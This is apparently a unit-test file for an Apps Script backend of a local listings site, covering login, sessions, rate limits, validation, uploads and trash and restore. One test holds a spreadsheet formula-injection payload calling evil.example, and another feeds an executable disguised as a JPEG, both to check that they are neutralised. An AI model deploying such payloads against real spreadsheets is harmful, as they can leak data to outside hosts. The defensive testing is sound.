// Unit tests for apps-script/Code.gs, run on the in-memory Apps Script simulator.
// Every check is an assertion: the run fails on the first unexpected result.
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { loadGas } = require('./helpers/gas-mock');

const GW = 'g'.repeat(40);
const PIN = 'correct-pin-123';
const EV_H = ['النوع', 'الاسم', 'العائلة', 'من تاريخ', 'إلى تاريخ', 'مكان الرجال', 'العنوان', 'وقت الرجال', 'مكان النساء', 'وقت النساء', 'الهاتف', 'رابط الموقع', 'ملاحظات', 'صورة', 'سبب الدعوة', 'الدفن'];
const DIW_H = ['اسم الديوان', 'صاحب الديوان', 'القطعة', 'الشارع / المنزل', 'الأيام', 'وقت الاستقبال', 'الهاتف', 'رابط الموقع', 'ملاحظات', 'الاعتذار', 'سبب الاعتذار', 'صورة', 'شعار'];
const AD_H = ['العنوان', 'الجهة', 'من تاريخ', 'إلى تاريخ', 'المكان', 'الوقت', 'التفاصيل', 'رابط', 'الهاتف', 'رابط الموقع', 'صورة', 'فيديو'];
const SV_H = ['الاسم', 'المهنة', 'الهاتف', 'يخدم مناطق', 'ملاحظات', 'رابط الموقع', 'صورة'];

function fresh(extra) {
  return loadGas(Object.assign({
    props: { GATEWAY_SECRET: GW, PIN: PIN },
    sheets: {
      'المناسبات': [EV_H,
        ['فرح', 'محمد', 'آل سالم', '2026-11-29', '2026-11-29', 'صالة', '', '', '', '', '', '', '', '', '', ''],
        ['عزاء', 'قديم جداً', 'آل', '2026-10-01', '2026-10-03', '', '', '', '', '', '', '', '', '', '', ''],
        ['عزاء', 'منتهٍ قريباً', 'آل', '2026-11-20', '', '', '', '', '', '', '', '', '', '', '', ''],
        ['دعوة غداء', 'أمس', 'آل', '2026-11-26', '2026-11-26', '', '', '', '', '', '', '', '', '', '', ''],
        ['فرح', 'بلا تاريخ', '', 'غير معروف', '', '', '', '', '', '', '', '', '', '', '', '']],
      'الدواوين': [DIW_H,
        ['ديوان أحمد', 'أ', '3', '', 'الأحد', '', '99887766', '', '', '', '', '', ''],
        ['ديوان أحمد', 'ب', '6', '', 'الاثنين', '', '', '', '', '', '', '', ''],
        ['ديوان خالد', 'خ', '1', '', 'الأحد', '', '', 'http://old.example/map', '', '', '', '', '']],
      'الإعلانات': [AD_H,
        ['جارٍ', 'جهة', '2026-11-20', '2026-12-10', '', '', '', '', '', '', '', ''],
        ['منتهٍ', 'جهة', '2026-11-01', '2026-11-05', '', '', '', '', '', '', '', ''],
        ['دائم', 'جهة', 'دائم', 'دائم', '', '', '', '', '', '', '', '']],
      'الخدمات': [SV_H, ['أبو محمد', 'حداد', '99887766', '', '', '', ''], ['أبو علي', 'كهربائي', '55443322', '', '', '', '']]
    }
  }, extra || {}));
}
const login = (G, ip, pin) => G.post({ gw: GW, op: 'login', ip: ip || '1.1.1.1', pin: pin === undefined ? PIN : pin });
const admin = (G, token, req) => G.post({ gw: GW, op: 'admin', ip: '1.1.1.1', token, req });

test('gateway secret is required for every gateway operation', () => {
  const G = fresh();
  assert.equal(G.post({ gw: 'wrong', op: 'public' }).error, 'forbidden');
  assert.equal(G.post({ gw: '', op: 'login', pin: PIN }).error, 'forbidden');
  assert.equal(G.post({ gw: GW, op: 'public' }).ok, true);
});

test('login with correct PIN issues a session; wrong PIN does not', () => {
  const G = fresh();
  const bad = login(G, '1.1.1.1', 'nope');
  assert.equal(bad.ok, false); assert.equal(bad.error, 'pin');
  const ok = login(G);
  assert.equal(ok.ok, true);
  assert.match(ok.token, /^[0-9a-f]{64}$/);
  assert.equal(G.post({ gw: GW, op: 'session', token: ok.token }).ok, true);
  // the store keeps only a hash of the token, never the token itself
  assert.ok(!Object.keys(G.props).some(k => k.includes(ok.token)));
  assert.ok(!Object.values(G.props).some(v => String(v).includes(ok.token)));
});

test('rate limit is per address: an attacker does not lock out the admin', () => {
  const G = fresh();
  for (let i = 0; i < 20; i++) login(G, '6.6.6.6', 'guess' + i);
  const blocked = login(G, '6.6.6.6', PIN);
  assert.equal(blocked.error, 'wait');
  assert.ok(blocked.retryAfter > 0);
  const admin = login(G, '1.1.1.1', PIN);
  assert.equal(admin.ok, true, 'admin from another address must still log in');
});

test('backoff starts after 5 failures and expires with time', () => {
  const G = fresh();
  for (let i = 0; i < 4; i++) assert.equal(login(G, '2.2.2.2', 'x').error, 'pin');
  assert.equal(login(G, '2.2.2.2', 'x').error, 'pin'); // 5th failure sets the wait
  assert.equal(login(G, '2.2.2.2', PIN).error, 'wait');
  G.clock.advance(61 * 1000);
  assert.equal(login(G, '2.2.2.2', PIN).ok, true);
});

test('login counts attempts under the script lock (no concurrent bypass)', () => {
  const G = fresh();
  G.events.length = 0;
  login(G, '3.3.3.3', 'x');
  const i = G.events.indexOf('lock'), put = G.events.findIndex(e => e.startsWith('cache.put')), un = G.events.indexOf('unlock');
  assert.ok(i >= 0 && put > i && un > put, 'counter must be read and written while the lock is held: ' + G.events.join(','));
});

test('sessions expire after 12 idle hours and after 7 days at most', () => {
  const G = fresh();
  const t = login(G).token;
  G.clock.advance(11 * 3600e3);
  assert.equal(G.post({ gw: GW, op: 'session', token: t }).ok, true);
  G.clock.advance(12 * 3600e3 + 1000);
  assert.equal(G.post({ gw: GW, op: 'session', token: t }).error, 'auth');
  const t2 = login(G).token;
  // used every 11 hours: still valid until 7 days after login, then refused
  for (let h = 11; h < 7 * 24; h += 11) { G.clock.advance(11 * 3600e3); assert.equal(G.post({ gw: GW, op: 'session', token: t2 }).ok, true, 'hour ' + h); }
  G.clock.advance(11 * 3600e3);
  assert.equal(G.post({ gw: GW, op: 'session', token: t2 }).error, 'auth');
});

test('logout ends one session; changing the PIN ends all sessions', () => {
  const G = fresh();
  const a = login(G).token, b = login(G, '9.9.9.9').token;
  G.post({ gw: GW, op: 'logout', token: a });
  assert.equal(G.post({ gw: GW, op: 'session', token: a }).error, 'auth');
  assert.equal(G.post({ gw: GW, op: 'session', token: b }).ok, true);
  assert.equal(admin(G, b, { action: 'changePin', oldPin: 'wrong', newPin: 'new-pin-123456' }).error, 'pin');
  assert.equal(admin(G, b, { action: 'changePin', oldPin: PIN, newPin: 'short' }).error, 'invalid');
  assert.equal(admin(G, b, { action: 'changePin', oldPin: PIN, newPin: 'new-pin-123456' }).ok, true);
  assert.equal(G.post({ gw: GW, op: 'session', token: b }).error, 'auth');
  assert.equal(G.props.PIN, undefined, 'plain PIN removed after change');
  assert.ok(G.props.PIN_HASH && G.props.PIN_SALT);
  assert.ok(!Object.values(G.props).includes('new-pin-123456'));
  assert.equal(login(G, '1.1.1.1', PIN).error, 'pin');
  assert.equal(login(G, '1.1.1.1', 'new-pin-123456').ok, true);
});

test('admin operations require a valid session', () => {
  const G = fresh();
  assert.equal(admin(G, 'f'.repeat(64), { action: 'data' }).error, 'auth');
  assert.equal(admin(G, 'not-a-token', { action: 'data' }).error, 'auth');
  const t = login(G).token;
  assert.equal(admin(G, t, { action: 'data' }).ok, true);
});

test('legacy PIN path works during transition and is closed by LEGACY_PIN=off', () => {
  const G = fresh();
  assert.equal(G.post({ pin: PIN, action: 'check' }).ok, true);
  G.props.LEGACY_PIN = 'off';
  assert.equal(G.post({ pin: PIN, action: 'check' }).error, 'pin');
  assert.equal(G.post({ pin: PIN, action: 'append', sheet: 'services', row: ['x', 'سباك', '90000000'] }).error, 'pin');
});

test('the browser cannot choose sheet names or headers', () => {
  const G = fresh();
  const t = login(G).token;
  const r = admin(G, t, { action: 'append', sheet: 'trashx', title: 'المحذوفات', headers: ['a'], row: ['x'] });
  assert.equal(r.ok, false);
  assert.equal(r.error, 'section');
  assert.equal(G.sheets['المحذوفات'], undefined);
  // a known section always maps to its approved sheet
  admin(G, t, { action: 'append', sheet: 'pharmacies', title: 'سجل العمليات', row: ['صيدلية', '22224444'] });
  assert.ok(G.sheets['الصيدليات']);
  assert.deepEqual(G.sheets['الصيدليات'].d[0].slice(0, 2), ['اسم الصيدلية', 'الهاتف']);
});

test('schema validation rejects invalid data with a clear field and reason', () => {
  const G = fresh();
  const t = login(G).token;
  const cases = [
    [['', 'سباك', '90000000'], 'الاسم'],
    [['اسم', 'سباك', 'abc'], 'الهاتف'],
    [['اسم', 'سباك', '90000000', '', '', 'http://insecure.example'], 'رابط الموقع'],
    [['اسم', 'سباك', '90000000', 'x'.repeat(300)], 'يخدم مناطق'],
    [['اسم', 'سباك', '90000000', '', '', '', '', 'extra'], undefined]
  ];
  for (const [row, field] of cases) {
    const r = admin(G, t, { action: 'append', sheet: 'services', row });
    assert.equal(r.ok, false, JSON.stringify(row));
    assert.equal(r.error, 'invalid');
    if (field) assert.equal(r.field, field);
  }
  const ev = admin(G, t, { action: 'append', sheet: 'events', row: ['فرح', 'س', '', '2026-02-30'] });
  assert.equal(ev.field, 'من تاريخ');
  const order = admin(G, t, { action: 'append', sheet: 'events', row: ['فرح', 'س', '', '2026-12-05', '2026-12-01'] });
  assert.equal(order.reason, 'تاريخ النهاية قبل البداية');
  const en = admin(G, t, { action: 'append', sheet: 'salons', row: ['صالون', 'نوع غير موجود'] });
  assert.equal(en.field, 'النوع');
});

test('Arabic digits and +965 numbers are accepted and stored as text', () => {
  const G = fresh();
  const t = login(G).token;
  assert.equal(admin(G, t, { action: 'append', sheet: 'services', row: ['أبو سالم', 'سباك', '٩٩٨٨٧٧٠٠'] }).ok, true);
  assert.equal(admin(G, t, { action: 'append', sheet: 'services', row: ['أبو فهد', 'سباك', '+96599887711'] }).ok, true);
  const rows = G.sheets['الخدمات'].d;
  assert.equal(rows[rows.length - 2][2], '99887700');
  assert.equal(rows[rows.length - 1][2], '+96599887711');
});

test('spreadsheet formula injection is neutralised', () => {
  const G = fresh();
  const t = login(G).token;
  const evil = '=IMPORTXML("https://evil.example","//a")';
  assert.equal(admin(G, t, { action: 'append', sheet: 'services', row: ['أبو خطر', 'سباك', '90000000', '', evil] }).ok, true);
  const row = G.sheets['الخدمات'].d.at(-1);
  assert.equal(typeof row[4], 'string', 'must not become a formula');
  assert.equal(row[4], evil);
  assert.equal(admin(G, t, { action: 'append', sheet: 'services', row: ['@x', 'سباك', '90000000'] }).ok, true);
  assert.equal(typeof G.sheets['الخدمات'].d.at(-1)[0], 'string');
  // reading back gives the original text, without an apostrophe
  const data = admin(G, t, { action: 'data' });
  assert.ok(data.services.some(r => r.v[4] === evil));
});

test('editing an old record keeps unchanged legacy values that would fail today', () => {
  const G = fresh();
  const t = login(G).token;
  const row = ['ديوان خالد', 'خ', '1', '', 'الأحد', 'بعد العشاء', '', 'http://old.example/map', '', '', '', '', ''];
  const r = admin(G, t, { action: 'update', sheet: 'diwaniyas', rowNum: 4, expect: 'ديوان خالد', row });
  assert.equal(r.ok, true, JSON.stringify(r));
  const changed = row.slice(); changed[7] = 'http://new.example';
  assert.equal(admin(G, t, { action: 'update', sheet: 'diwaniyas', rowNum: 4, expect: 'ديوان خالد', row: changed }).field, 'رابط الموقع');
});

test('update and delete refuse when the row changed (stale row number)', () => {
  const G = fresh();
  const t = login(G).token;
  assert.equal(admin(G, t, { action: 'delete', sheet: 'services', rowNum: 2, expect: 'أبو علي' }).error, 'changed');
  assert.equal(admin(G, t, { action: 'delete', sheet: 'services', rowNum: 99, expect: 'x' }).error, 'changed');
});

test('delete moves the row to trash, restore puts the same row back, both are logged', () => {
  const G = fresh();
  const t = login(G).token;
  const before = G.sheets['الخدمات'].d[2].slice();
  assert.equal(admin(G, t, { action: 'delete', sheet: 'services', rowNum: 3, expect: 'أبو علي' }).ok, true);
  assert.equal(G.sheets['الخدمات'].d.length, 2);
  const tr = admin(G, t, { action: 'trash' });
  assert.equal(tr.total, 1); assert.equal(tr.items[0].label, 'أبو علي');
  assert.equal(admin(G, t, { action: 'restore', trashRow: tr.items[0].row, expect: 'wrong' }).error, 'changed');
  assert.equal(admin(G, t, { action: 'restore', trashRow: tr.items[0].row, expect: tr.items[0].time }).ok, true);
  assert.deepEqual(G.sheets['الخدمات'].d.at(-1).slice(0, 7), before.slice(0, 7));
  const log = admin(G, t, { action: 'log' });
  assert.deepEqual(log.items.map(x => x.action).slice(0, 2), ['استرجاع', 'حذف']);
  assert.equal(log.items[0].admin, 'المشرف');
  assert.ok(G.sheets['سجل العمليات'].d.at(-1)[8], 'session reference recorded');
});

test('apology goes to the right diwan when names repeat', () => {
  const G = fresh();
  const t = login(G).token;
  assert.equal(admin(G, t, { action: 'apology', name: 'ديوان أحمد', mode: 'pause' }).error, 'ambiguous');
  assert.equal(admin(G, t, { action: 'apology', name: 'ديوان أحمد', rowNum: 3, mode: 'pause' }).ok, true);
  assert.equal(G.sheets['الدواوين'].d[2][9], 'متوقف');
  assert.equal(G.sheets['الدواوين'].d[1][9] || '', '');
  assert.equal(admin(G, t, { action: 'apology', name: 'ديوان خالد', mode: 'date', date: '2026-02-30' }).error, 'invalid');
});

test('a failed log write is kept for reconciliation and reported, not ignored', () => {
  const G = fresh();
  const t = login(G).token;
  admin(G, t, { action: 'append', sheet: 'services', row: ['أ', 'سباك', '90000001'] }); // creates the log sheet
  const logSheet = G.sheets['سجل العمليات'];
  const real = logSheet.getRange;
  logSheet.getRange = () => { throw new Error('quota'); };
  const r = admin(G, t, { action: 'append', sheet: 'services', row: ['ب', 'سباك', '90000002'] });
  assert.equal(r.ok, true);
  assert.equal(r.logWarning, true);
  assert.ok(Object.keys(G.props).some(k => k.startsWith('pendinglog_')));
  logSheet.getRange = real;
  admin(G, t, { action: 'append', sheet: 'services', row: ['ج', 'سباك', '90000003'] });
  assert.ok(!Object.keys(G.props).some(k => k.startsWith('pendinglog_')), 'pending entries flushed');
  assert.equal(logSheet.d.filter(x => x[4] === 'ب').length, 1);
  assert.ok(G.sheets['سجل الأخطاء'], 'the failure itself is recorded with a reference');
});

test('internal errors return a reference, never details', () => {
  const G = fresh();
  const t = login(G).token;
  G.sheets['الخدمات'].getRange = () => { throw new Error('secret internal detail'); };
  const r = admin(G, t, { action: 'append', sheet: 'services', row: ['أ', 'سباك', '90000001'] });
  assert.equal(r.error, 'server');
  assert.match(r.ref, /^E-[0-9A-F]{6}$/);
  assert.ok(!JSON.stringify(r).includes('secret internal detail'));
  assert.ok(G.sheets['سجل الأخطاء'].d.some(row => row[1] === r.ref && row[3].includes('secret internal detail')));
});

test('public data: approved columns only, no row numbers, no expired items, no admin sheets', () => {
  const G = fresh();
  G.sheets['الخدمات'].d[1].push('عمود خاص إضافي');
  const t = login(G).token;
  admin(G, t, { action: 'delete', sheet: 'services', rowNum: 3, expect: 'أبو علي' });
  const p = G.post({ gw: GW, op: 'public' });
  const names = p.events.map(r => r.v[1]);
  assert.deepEqual(names.sort(), ['محمد', 'منتهٍ قريباً'].sort(), 'old condolence, past invitation and undated row are hidden');
  assert.deepEqual(p.ads.map(r => r.v[0]).sort(), ['جارٍ', 'دائم'].sort());
  assert.ok(p.services.every(r => r.v.length === 7), 'only the 7 approved columns');
  assert.ok(!JSON.stringify(p).includes('عمود خاص إضافي'));
  assert.ok(Object.values(p).every(v => !Array.isArray(v) || v.every(r => r.row === undefined)));
  assert.ok(!('trash' in p) && !JSON.stringify(p).includes('المحذوفات'));
});

test('public data respects Kuwait time near midnight', () => {
  // 2026-11-26 21:30 UTC = 2026-11-27 00:30 in Kuwait: yesterday's lunch invitation is gone
  const G = fresh({ start: Date.parse('2026-11-26T21:30:00Z') });
  const p = G.post({ gw: GW, op: 'public' });
  assert.ok(!p.events.some(r => r.v[1] === 'أمس'));
  const G2 = fresh({ start: Date.parse('2026-11-26T20:30:00Z') }); // 23:30 on the 26th in Kuwait
  assert.ok(G2.post({ gw: GW, op: 'public' }).events.some(r => r.v[1] === 'أمس'));
});

test('direct doGet returns filtered public data once the legacy path is closed', () => {
  const G = fresh({ props: { GATEWAY_SECRET: GW, PIN: PIN, LEGACY_PIN: 'off' } });
  const p = G.get({});
  assert.ok(p.services.every(r => r.row === undefined));
  assert.ok(!p.events.some(r => r.v[1] === 'قديم جداً'));
});

const b64 = bytes => Buffer.from(bytes).toString('base64');
const JPEG = [0xff, 0xd8, 0xff, 0xe0, ...Array(200).fill(1), 0xff, 0xd9];
const PNG = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...Array(50).fill(2), 0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82];
const MP4 = [0, 0, 0, 0x18, 0x66, 0x74, 0x79, 0x70, ...Array(100).fill(3)];
const EXE = [0x4d, 0x5a, 0x90, 0, ...Array(100).fill(0)];

test('uploads: only real images/videos, size limits, private until the record is saved', () => {
  const G = fresh();
  const t = login(G).token;
  assert.equal(admin(G, t, { action: 'upload', type: 'image/jpeg', data: b64(EXE) }).error, 'filecorrupt', 'executable disguised as JPEG');
  assert.equal(admin(G, t, { action: 'upload', type: 'application/x-msdownload', data: b64(EXE) }).error, 'filetype');
  assert.equal(admin(G, t, { action: 'upload', type: 'image/jpeg', data: b64(JPEG.slice(0, 100)) }).error, 'filecorrupt', 'truncated JPEG');
  assert.equal(admin(G, t, { action: 'upload', type: 'image/png', data: b64(JPEG) }).error, 'filecorrupt', 'JPEG declared as PNG');
  assert.equal(admin(G, t, { action: 'upload', type: 'image/jpeg', data: 'A'.repeat(8 * 1024 * 1024) }).error, 'filesize');
  assert.equal(admin(G, t, { action: 'upload', type: 'image/png', data: b64(PNG) }).ok, true);
  assert.equal(admin(G, t, { action: 'upload', type: 'video/mp4', data: b64(MP4) }).ok, true);
  const up = admin(G, t, { action: 'upload', type: 'image/jpeg', data: b64(JPEG) });
  assert.equal(up.ok, true);
  const id = up.url.match(/\/file\/d\/([\w-]+)/)[1];
  const file = G.drive.files[id];
  assert.match(file.name, /^wafra-\d{8}-[0-9a-f]{8}\.jpg$/);
  assert.equal(file.shared, false, 'not public before the record is saved');
  assert.equal(G.drive.folders[file.parent].name, 'معلّق');
  assert.equal(admin(G, t, { action: 'append', sheet: 'services', row: ['أبو صورة', 'سباك', '90000005', '', '', '', up.url] }).ok, true);
  assert.equal(file.shared, true);
  assert.equal(G.drive.folders[file.parent].name, 'صور دواوين الوفرة');
});

test('image reading rejects wrong types and oversized images before calling Gemini', () => {
  let called = 0;
  const G = fresh({ props: { GATEWAY_SECRET: GW, PIN: PIN, GEMINI_KEY: 'k' }, fetch: () => { called++; throw new Error('should not be called'); } });
  const t = login(G).token;
  assert.equal(admin(G, t, { action: 'extract', type: 'application/pdf', data: 'AAAA' }).error, 'filetype');
  assert.equal(admin(G, t, { action: 'extract', type: 'image/jpeg', data: 'A'.repeat(8 * 1024 * 1024) }).error, 'filesize');
  assert.equal(called, 0);
});

test('Gemini failure is reported without breaking anything', () => {
  const G = fresh({ props: { GATEWAY_SECRET: GW, PIN: PIN, GEMINI_KEY: 'k' }, fetch: () => ({ getResponseCode: () => 503, getContentText: () => '' }) });
  const t = login(G).token;
  const r = admin(G, t, { action: 'extract', type: 'image/jpeg', data: b64(JPEG) });
  assert.equal(r.ok, false); assert.equal(r.error, 'ai');
  assert.equal(admin(G, t, { action: 'data' }).ok, true);
});

test('deleting a record makes its photo private unless another record uses it; restore shares it again', () => {
  const G = fresh();
  const t = login(G).token;
  const up = admin(G, t, { action: 'upload', type: 'image/jpeg', data: b64(JPEG) });
  const id = up.url.match(/\/file\/d\/([\w-]+)/)[1];
  admin(G, t, { action: 'append', sheet: 'services', row: ['صاحب الصورة', 'سباك', '90000006', '', '', '', up.url] });
  admin(G, t, { action: 'append', sheet: 'pharmacies', row: ['صيدلية بنفس الصورة', '22224444', '', '', '', '', '', '', up.url] });
  const svRow = G.sheets['الخدمات'].d.length;
  assert.equal(admin(G, t, { action: 'delete', sheet: 'services', rowNum: svRow, expect: 'صاحب الصورة' }).ok, true);
  assert.equal(G.drive.files[id].shared, true, 'still used by the pharmacy');
  assert.equal(admin(G, t, { action: 'delete', sheet: 'pharmacies', rowNum: 2, expect: 'صيدلية بنفس الصورة' }).ok, true);
  assert.equal(G.drive.files[id].shared, false, 'no longer public');
  assert.equal(G.drive.files[id].trashed, false, 'file kept for restore');
  const tr = admin(G, t, { action: 'trash' }).items.find(x => x.label === 'صيدلية بنفس الصورة');
  assert.equal(admin(G, t, { action: 'restore', trashRow: tr.row, expect: tr.time }).ok, true);
  assert.equal(G.drive.files[id].shared, true);
});
